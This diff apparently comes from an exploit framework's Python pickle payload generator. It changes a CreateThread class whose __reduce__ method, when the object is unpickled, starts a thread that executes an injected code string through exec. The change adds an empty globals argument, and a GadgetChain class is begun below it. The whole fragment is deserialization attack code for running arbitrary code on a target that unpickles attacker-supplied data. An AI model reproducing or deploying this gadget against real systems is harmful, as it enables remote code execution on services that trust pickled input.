@@ -3,7 +3,7 @@ import threading
 
 class CreateThread:
     def __reduce__(self):
-        return threading.Thread, (None, __builtins__.exec, None, ('#{escaped}',))
+        return threading.Thread, (None, __builtins__.exec, None, ('#{escaped}', {}))
 
 class GadgetChain:
     def __reduce__(self):
